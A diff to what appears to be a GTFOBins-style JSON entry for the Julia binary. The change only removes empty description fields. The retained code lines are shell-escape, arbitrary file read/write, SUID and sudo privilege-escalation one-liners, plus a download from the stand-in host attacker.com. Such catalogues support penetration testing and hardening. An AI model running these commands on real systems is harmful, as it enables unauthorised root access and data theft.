@@ -2,25 +2,25 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "julia -e 'run(`/bin/sh`)'\n"
       }
     ],
     "file-read": [
       {
-        "description": "",
+        
         "code": "export LFILE=file_to_read\njulia -e 'print(open(f->read(f, String), ENV[\"LFILE\"]))'\n"
       }
     ],
     "file-write": [
       {
-        "description": "",
+        
         "code": "export LFILE=file_to_write\njulia -e 'open(f->write(f, \"DATA\"), ENV[\"LFILE\"], \"w\")'\n"
       }
     ],
     "file-download": [
       {
-        "description": "",
+        
         "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\njulia -e 'download(ENV[\"URL\"], ENV[\"LFILE\"])'\n"
       }
     ],
@@ -32,13 +32,13 @@
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "./julia -e 'run(`/bin/sh -p`)'\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo julia -e 'run(`/bin/sh`)'\n"
       }
     ]
